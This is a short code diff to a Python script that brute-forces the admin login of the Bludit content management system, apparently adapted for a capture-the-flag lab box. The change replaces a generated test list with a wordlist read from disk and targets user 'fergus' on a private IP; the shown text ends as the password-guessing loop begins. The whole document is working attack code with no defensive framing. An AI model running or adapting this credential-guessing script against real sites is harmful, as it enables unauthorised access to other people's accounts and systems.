@@ -1,18 +1,14 @@
-#!/usr/bin/env python3
 import re
 import requests
+#from __future__ import print_function
 
-host = 'http://192.168.194.146/bludit'
+def open_ressources(file_path):
+    return [item.replace("\n", "") for item in open(file_path).readlines()]
+
+host = 'http://10.10.10.191'
 login_url = host + '/admin/login'
-username = 'admin'
-wordlist = []
-
-# Generate 50 incorrect passwords
-for i in range(50):
-    wordlist.append('Password{i}'.format(i = i))
-
-# Add the correct password to the end of the list
-wordlist.append('adminadmin')
+username = 'fergus'
+wordlist = open_ressources('/home/hack17/wordlists.txt')
 
 for password in wordlist:
     session = requests.Session()
